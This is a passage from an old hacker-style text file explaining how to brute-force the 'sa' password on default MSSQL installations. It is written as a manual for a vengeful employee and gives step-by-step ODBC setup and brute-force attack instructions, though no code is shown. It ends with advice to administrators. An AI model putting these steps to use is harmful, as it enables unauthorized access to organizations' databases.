to this attack.  OK let's get it on!

Information
-----------

There are a few things in the default installation of MSSQL server that a 
malicious attacker could take advantage of.  First to gain access to any 
database you must first have to know what database you want access and have
a username to that database.  Well you're in luck; Microsoft has provided
you all that information in the default installation.  

Every database has a SQL login account named "sa".  The sa account (systems 
administrator) has administrative rights to every database in MSSQL server,
by default. It's just that easy, now you have a username that you want to
log in with.  

Next you will need a database that you want to get into. Again Microsoft has 
provided you with this information in the default installation.  Most admin-
istrators never remove the default databases.  The two default databases are
"Northwind" and "pubs". These are in the server as example databases and
they are always there, unless removed by the administrator.

Ok so now all that is needed is a password.  I will get more into how to
obtain that a little later.  MSSQL server is not very good with holding 
passwords.   While I was testing all this information I found out that while
I was always putting in case sensitive passwords MSSQL server didn't care
what case it was. So if I was putting in "AbCdE", then "abcde", or "ABCDE"
would work too.  Now what the hell is that all about?  Customers pay enormous
amounts of money to  get MSSQL, the Microsoft Server OS, and then pay more
money for CALs and the  SQL server doesn't even keep case sensitive passwords.
Well it can, if the server uses integrated security from the OS. We don't
care about that because out of 4 different MSSQL servers I have seen the sa
account was never integrated with the OS and all the default databases were
still sitting there.

These are some defaults that would make it easy for any attacker to get in 
fairly easy.  You now know everything that you need to get into a default 
installation of MSSQL except the password.  I will now give you the details
on how to obtain the password for the sa account.  The ways described to
obtain passwords are in no way perfect you will also need a little bit of
luck.

Details
-------

Now with the information provided above I am sure that anyone can figure out 
that a default installation of MSSQL is vulnerable to a brute force attack.  
So you have an angry employee on your network and they know this information, 
what are they going to do to come after your server?  There are three stages 
in a MSSQL brute force attack.  First you have to find out where the server
is, then a brute force program will have to be written, and lastly the attack
will be launched.  

The details of the attack will be written as a manual for a malicious user. 
This will make it easier to write because I have had to go through these
steps and I have never had a user try to do this to one of my servers. So
now it is time to start thinking like a pissed off employee that wants a
little revenge.

How to find out where the company has there database.  This is simple, using
a windows system open the control panel and open the ODBC data sources. The
ODBC data source administrator is a very powerful control.  This will tell
use where the MSSQL server is and it will also be there to connect the brute
force program to the database.

On the system DSN tab click add.  You will have another window come up and
we are going to start creating a connection to the unknown SQL server. Use
the "SQL Server" driver and click next or finish, whatever you see.  Name
the connection whatever you want to.  I like to call it brute.  Fill in
the description or leave it blank.  Now click the toggle button on the
"server" field and WOW! there is your server. Click next and you will see
a very important screen.

This is where we choose to use SQL Server authentication.  Do not include
a login ID.  Uncheck the box that is labeled "Connect to SQL Server to
obtain default settings for the additional configuration options".  In my
experience I have found that sometimes during the brute force attack that
the ODBC connection will loose this setting.  So if the attack slows down
or stalls this may be the reason.  The rest of the connection will all be
default settings. Don't try to test the connection because it will fail.

Ok so now we know where the server is and we have a connection made to it.
All we need now is the password for the sa account.  How to we get it?
Well there are many different ways to crack a MSSQL password, social eng-
ineering, a dictionary attack, or my favorite BRUTE FORCE!  You don't want
to spend a lot of time trying to get this password but today administrators
are using complex and very long passwords.  If this is the case you will
probably never get the password and your administrator has won the fight.
If you have an admin like some I know then you crack the sa password in a
few days and then you will probably have the password to other accounts.

Time to decide if this is the right attack for you.  First you have to 
understand how a brute force attack works, and how long it may take.  A
brute force attack goes through every ASCII combination before the correct
one is found.  When you launch a brute force attack on a MSSQL server we
already know that we can eliminate 26 ASCII characters because there are
no case sensitive passwords.  Most people use all lowercase letters in a
password and that makes cracking passwords very easy.  When you start
using numerical and non alphanumeric characters there can be 68 different
characters in one position which then causes a brute force attack to take
a very long time.

The following table will help anyone understand how long it could take to
crack a complex password.

Now that you have seen these staggering numbers you wish that was in your
bank account.  Well in one of my tests I changed the sa password to ‘zzzz’
this would be the very last password in the combinations that had 4 char-
acters using only lower case letters.  Well it took the program only 336
minutes. So let’s just say if the sa password is over 5 characters long
or includes punctuation you will never live long enough to see the pass-
word get cracked. I never said a brute force was the perfect attack.

So if you think your admin is an idiot and uses small passwords you will
want to continue.  The next step is to create the brute force program.
I chose to write this in visual basic 6 just because it is easy to write
and I have a license to use MS VB6.  In the program I broke down the
attack into four stages weak, normal, strong, and crazy strong.  If you
have to use strong or the crazy strong options you will probably not get
the password in your lifetime.

Of course if you will have to create a visual interface with this code but 
that’s the easy part.  Spend as much time on it as you want.  You can also
add functionality to the program by running it as a service or minimizing
it to the system tray, but I chose not to add this in.  Of course you will
have to set the properties on the timer object and you will have to compile
the executable but you already knew that right?

Alright now we are on to step three, cracking the sa password.  I first
opened the ODBC connection and made sure the settings were correct and
tested it with a plain user account.  Open up the brute force program and
select the strength that you would like the attack to run at and then enter
‘NorthWind’ as the database.  In the username field enter ‘sa’, and the
provider for a MSSQL database is ‘MSDASQL.1’.  Hit the start button and all
you have to do is wait.

OK let’s say you left this program running while you went for your two week 
vacation and came back and you have the password.  Congratulations you now 
have administrative access to your company’s MSSQL database!  What to do
now you ask?  Well that is not for me to tell you.

Conclusion
----------

So now all you administrators out there know not to use weak passwords and
to remove all default databases out of MSSQL.  Well I hate to tell you,
that’s not enough.  Databases are used in so many different ways and how
you use your database probably opens up more ways to get into it.

While writing this phile I have now noticed eight other ways to get into
one MSSQL database.  All I can think of now is thank “God” I found out about
this before someone else did.  Security on your network is not a joke! Your
users probably know more than you give them credit for. So do what any smart
admin does and trust no one,  hack your own system then secure it.

Well that’s all for now kiddies, I hope you have had an educational exper-
ience reading this, and I hope you have changed your passwords on your MSSQL
server to insanely long and complex text strings.  Until next time watch
your network because you never know who is plotting their attack.
